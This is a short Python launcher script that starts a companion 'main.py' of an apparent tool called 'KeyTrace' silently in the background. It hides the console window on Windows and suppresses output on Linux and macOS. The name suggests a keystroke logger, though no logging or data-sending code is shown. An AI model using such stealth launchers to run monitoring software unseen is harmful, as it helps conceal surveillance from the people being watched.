import subprocess
import sys
import os
import platform

def run_in_background():
    system = platform.system()
    script_path = os.path.join(os.path.dirname(__file__), "main.py")
    base_cmd = [sys.executable, script_path, "--silent"]
    
    if system == "Windows":
        # Prefer pythonw.exe to hide console
        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
        if os.path.exists(pythonw):
            subprocess.Popen(
                [pythonw, script_path, "--silent"],
                creationflags=subprocess.DETACHED_PROCESS,
                cwd=os.path.dirname(__file__)
            )
        else:
            subprocess.Popen(
                base_cmd,
                creationflags=subprocess.CREATE_NO_WINDOW,
                cwd=os.path.dirname(__file__)
            )

    elif system in ["Linux", "Darwin"]:  # macOS = Darwin
        subprocess.Popen(
            base_cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            cwd=os.path.dirname(__file__)
        )
    else:
        print(f"[!] Unsupported platform: {system}")

if __name__ == "__main__":
    print("[*] Launching KeyTrace in background mode...")
    run_in_background()